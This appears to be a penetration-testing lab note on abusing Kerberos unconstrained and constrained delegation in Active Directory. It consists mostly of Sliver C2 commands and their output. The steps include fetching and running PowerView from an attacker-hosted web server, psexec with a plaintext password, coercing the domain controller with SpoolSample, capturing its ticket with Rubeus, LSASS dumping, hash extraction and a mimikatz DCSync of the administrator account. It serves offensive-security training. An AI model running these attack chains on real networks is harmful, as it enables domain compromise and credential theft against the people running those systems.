Enumeration
### Unconstrained

```sh
sliver (http-beacon) > rportfwd add -b 8080 -r 127.0.0.1:8080

[*] Reverse port forwarding 127.0.0.1:8080 <- :8080
```

![](Kerberos%20Delegation-20261111-124912.png)

|**Step**|**Description**|
|---|---|
|Step 1: User to DC|The user requests a TGT.|
|Step 2: DC to user|The user gets the TGT.|
|Step 3: User to DC|The user requests a TGS ticket.|
|Step 4: DC to user|The user gets the TGS ticket.|
|Step 5: User to the IIS server|The user sends both the TGT and TGS ticket.|
|Step 6: IIS server to DC|The IIS server uses the user’s TGT to request a TGS ticket to DC to access the MSSQL server.|
|Step 7: IIS server to MSSQL server|The IIS server acts on behalf of the user to access the MSSQL server.|

```sh
3kjS@htb[/htb]$ echo "Get-NetComputer -Unconstrained" | base64 
R2V0LU5ldENvbXB1dGVyIC1VbmNvbnN0cmFpbmVkCg==
```

```sh
sliver (psexec-pivot) > sharpsh -- '-u http://172.16.1.11:8080/PowerView.ps1 -e -c R2V0LU5ldENvbXB1dGVyIC1VbmNvbnN0cmFpbmVkCg=='

[*] sharpsh output:

dc01.child.htb.local
srv01.child.htb.local
```

```sh
3kjS@htb[/htb]$ proxychains impacket-psexec child/svc_sql:jkhnrjk123\!@172.16.1.12
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:445  ...  OK
[*] Requesting shares on 172.16.1.12.....
[*] Found writable share ADMIN$
[*] Uploading file fgKxWuqO.exe
[*] Opening SVCManager on 172.16.1.12.....
[*] Creating service NFeK on 172.16.1.12.....
[*] Starting service NFeK.....
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:445  ...  OK
[!] Press help for extra shell commands
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:445  ...  OK
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd ../tasks
d ../tasks
PS C:\Windows\tasks> .\Rubeus.exe monitor /interval:5 /nowrap
.\Rubeus.exe monitor /interval:5 /nowrap

<SNIP>
```

Wait for high-privilege users to access this computer's services, such as CIFS. Or we can use spoolsample to coerce a computer to authenticate to this computer via the MS-RPRN RPC interface; the command is `SpoolSample.exe dc01 srv01`. The `SpoolSample.exe` binary can be downloaded via the following GitHub repository - [https://github.com/jtmpu/PrecompiledBinaries](https://github.com/jtmpu/PrecompiledBinaries).

```sh
sliver (psexec-pivot) > inline-execute-assembly /home/htb-ac590/SpoolSample.exe 'dc01 srv01'

[*] Successfully executed inline-execute-assembly (coff-loader)
[*] Got output:
[+] Success - Wrote 157715 bytes to memory
[+] Using arguments: dc01 srv01


[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function

[+] inlineExecute-Assembly Finished
```

In the PsExec impacket shell session, we see a captured ticket of `DC01$`.

Having the TGT of DC01, we will proceed to save it in a kirbi format.

```sh
PS C:\Windows\system32> [System.IO.File]::WriteAllBytes("C:\windows\temp\dc01.kirbi",[System.Convert]::FromBase64String("doIFJjCCBSKgA <SNIP> Q0hJTEQuSFRCLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9DSElMRC5IVEIuTE9DQUw="))
```

```sh
C:\Windows\Tasks>.\mimikatz.exe "privilege::debug" "kerberos::ptt 
C:\windows\temp\dc01.kirbi" "lsadump::dcsync /domain:child.htb.local /user:child\administrator" "exit"

mimikatz(commandline) # privilege::debug 
Privilege '20' OK 

mimikatz(commandline) # kerberos::ptt C:\windows\temp\dc01.kirbi 

* File: 'C:\windows\temp\dc01.kirbi': OK 

mimikatz(commandline) # lsadump::dcsync /domain:child.htb.local
```
### Constrained Delegation

![](Kerberos%20Delegation-20261111-125518.png)

|**Step**|**Description**|
|---|---|
|Step 1: User to IIS Server|The user authenticates to the IIS server via NTLM authentication, as long as the authentication is not Kerberos.|
|Step 2: IIS Server to DC|The IIS server utilizes S4U2Self to request a TGS ticket for the user to access itself (IIS Server).|
|Step 3: DC to IIS Server|The KDC returns the forwardable TGS ticket to the IIS server.|
|Step 4: IIS Server to DC|The IIS Server utilizes S4U2Proxy to request a TGS ticket for the user to access the SQL server.|
|Step 5: DC to IIS Server|The KDC returns the TGS ticket to the IIS server.|
|Step 6: IIS Server to SQL Server|The IIS server acts on behalf of the user to access the SQL service with the forwardable TGS ticket.|
#### Enumeration

```sh
sliver (http-beacon) > sharpview Get-NetComputer -TrustedToAuth
```
#### Exploitation

```sh
sliver (http-beacon) > nanodump 656 web01-lsass 1 PMDM

sliver (http-beacon) > download web01-lsass
```

We are going to utilize `pypykatz` to dump the hashes.

```sh
3kjS@htb[/htb]$ python3 -m pypykatz lsa minidump web01-lsass
INFO:pypykatz:Parsing file web01-lsass
FILE: ======== web01-lsass =======
== LogonSession ==
authentication_id 442065 (6bed1)
session_id 2
username eric
domainname CHILD
logon_server DC01
logon_time 2024-04-02T19:12:33.589262+00:00
sid S-1-5-21-2749819870-3967162335-1946002573-1122
<SNIP>
```

```sh
sliver (http-beacon) > inline-execute-assembly /home/htb-ac-1008/Rubeus.exe 'asktgt /user:web01$ /rc4:021b6a0d0e0ca246ec266bb72a481bc6 /nowrap'
```

```sh
sliver (http-beacon) > inline-execute-assembly /home/htb-ac-1008/Rubeus.exe 's4u /impersonateuser:carrot /msdsspn:eventsystem/srv02.child.htb.local /user:web01$ /ticket:doIE8DCCBOygAwIBBaEDAgEWoo<SNIP>sZC5odGIubG9jYWw= /nowrap'
```

After the successful execution of the attack, we can verify the access we have on `srv02.child.htb.local`.

```sh
sliver (http-beacon) > ls //srv02.child.htb.local/c$
```
